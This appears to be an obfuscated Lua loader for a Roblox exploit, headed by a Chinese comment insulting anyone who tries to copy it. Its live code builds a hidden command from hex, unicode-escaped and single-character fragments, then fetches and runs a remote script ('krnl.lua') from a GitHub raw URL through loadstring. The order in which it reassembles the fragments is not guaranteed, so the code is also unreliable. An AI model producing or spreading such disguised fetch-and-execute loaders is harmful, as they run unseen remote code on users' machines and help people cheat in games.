--[[你个傻逼还想盗我的东西，你他妈是不是骂死了？还想看我的链接，你的父母是不是s完了

😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂😂
]]
--[[local _={}
_[1]="\u{006c}\u{006f}\u{0061}\u{0064}\u{0073}\u{0074}\u{0072}\u{0069}\u{006e}\u{0067}"
_[2]="\u{0028}"
_[3]="\u{0067}\u{0061}\u{006d}\u{0065}"
_[4]="\u{003a}"
_[5]="\u{0048}\u{0074}\u{0074}\u{0070}\u{0047}\u{0065}\u{0074}"
_[6]="\u{0028}"
_[7]="\u{0022}"
_[8]="\u{0068}\u{0074}\u{0074}\u{0070}\u{0073}\u{003a}\u{002f}\u{002f}\u{0072}\u{0061}\u{0077}\u{002e}\u{0067}\u{0069}\u{0074}\u{0068}\u{0075}\u{0062}\u{0075}\u{0073}\u{0065}\u{0072}\u{0063}\u{006f}\u{006e}\u{0074}\u{0065}\u{006e}\u{0074}\u{002e}\u{0063}\u{006f}\u{006d}\u{002f}\u{004d}\u{0050}\u{0030}\u{0030}\u{004e}\u{002f}\u{004d}\u{0050}\u{002f}\u{0072}\u{0065}\u{0066}\u{0073}\u{002f}\u{0068}\u{0065}\u{0061}\u{0064}\u{0073}\u{002f}\u{006d}\u{0061}\u{0069}\u{006e}\u{002f}\u{006b}\u{0072}\u{006e}\u{006c}\u{002e}\u{006c}\u{0075}\u{0061}"
_[9]="\u{0022}"
_[10]="\u{0029}\u{0029}\u{0028}\u{0029}"

local function __()
    return _[1].._[2].._[3].._[4].._[5].._[6].._[7].._[8].._[9].._[10]
end

loadstring(__())()
]]
local fragmentStore = {
    [math.random(1000,9999)] = {
        "\x6c\x6f\x61", -- "loa"
        "\x64\x73\x74", -- "dst"
        "\x72\x69\x6e", -- "rin"
        "\x67\x28"      -- "g("
    },
    ["block_"..tostring(math.random(1,100))] = function()
        return {
            [[g]], 
            [[a]], 
            [[m]], 
            [[e]], 
            [[:]], 
            "\u{0048}".."\u{0074}".."\u{0074}".."\u{0070}".."\u{0047}".."\u{0065}".."\u{0074}"
        }
    end,
    ["url_chunk_"..os.time()%1000] = {
        [[(]], 
        [["]], 
        [[h]], 
        [[t]], 
        [[t]], 
        [[p]], 
        [[s]], 
        [[:]], 
        [[/]], 
        [[/]], 
        [[r]], 
        [[a]], 
        [[w]], 
        [[.]], 
        [[g]], 
        [[i]], 
        [[t]], 
        [[h]], 
        [[u]], 
        [[b]], 
        [[u]], 
        [[s]], 
        [[e]], 
        [[r]], 
        [[c]], 
        [[o]], 
        [[n]], 
        [[t]], 
        [[e]], 
        [[n]], 
        [[t]], 
        [[.]], 
        [[c]], 
        [[o]], 
        [[m]], 
        [[/]], 
        [[M]], 
        [[P]], 
        [[0]], 
        [[0]], 
        [[N]], 
        [[/]], 
        [[M]], 
        [[P]], 
        [[/]], 
        [[r]], 
        [[e]], 
        [[f]], 
        [[s]], 
        [[/]], 
        [[h]], 
        [[e]], 
        [[a]], 
        [[d]], 
        [[s]], 
        [[/]], 
        [[m]], 
        [[a]], 
        [[i]], 
        [[n]], 
        [[/]], 
        [[k]], 
        [[r]], 
        [[n]], 
        [[l]], 
        [[.]], 
        [[l]], 
        [[u]], 
        [[a]], 
        [["]], 
        [[)]], 
        [[)]], 
        [[(]], 
        [[)]]
    }
}

local assembledCode = ""
for _, container in pairs(fragmentStore) do
    if type(container) == "function" then
        local parts = container()
        for _, part in ipairs(parts) do
            assembledCode = assembledCode .. part
        end
    else
        for _, part in ipairs(container) do
            assembledCode = assembledCode .. part
        end
    end
end

local executor = loadstring
executor(assembledCode)()
